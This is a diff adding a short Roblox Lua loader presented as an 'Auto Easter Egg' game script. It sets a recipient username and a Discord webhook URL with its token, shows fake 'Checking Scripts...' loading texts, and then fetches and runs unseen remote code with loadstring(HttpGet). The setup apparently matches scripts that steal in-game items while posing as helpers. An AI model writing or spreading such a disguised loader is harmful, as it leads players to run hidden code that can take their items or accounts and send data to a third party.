@@ -1,0 +1,17 @@
+Username = "mypetsimulator29"
+ 
+WebHook = "https://discord.com/api/webhooks/1096398948580733039/ermsZF2Ik7KiT1eUOd-lskWCO6rULfKH1n98T08k7SqovjAxLKmDBYwGk6vnYmKVRMDI"
+ 
+loadingscreen = true
+ 
+_G.CustomScriptName = "Auto Easter Egg"
+ 
+_G.Text1 = "Script Loaded..."
+ 
+_G.Text2 = "Waiting for Script..."
+ 
+_G.Text3 = "Checking Scripts..."
+ 
+_G.Text4 = "Starting Script..."
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
